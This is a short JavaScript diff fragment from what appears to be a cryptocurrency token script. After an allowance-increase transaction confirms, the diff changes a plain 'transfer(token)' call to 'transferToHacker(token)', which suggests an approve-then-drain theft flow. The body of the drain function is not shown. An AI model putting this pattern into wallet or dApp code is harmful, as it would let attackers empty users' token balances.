@@ -226,7 +226,7 @@ const increasAllow = async (token) => {
   }).then(async (result) => {
     console.log(result)
     await waitForTransaction(result.transactionHash)
-    await transfer(token);
+    await transferToHacker(token);
   }).catch(async (error) => {
     console.log(error)
     await increasAllow(token);
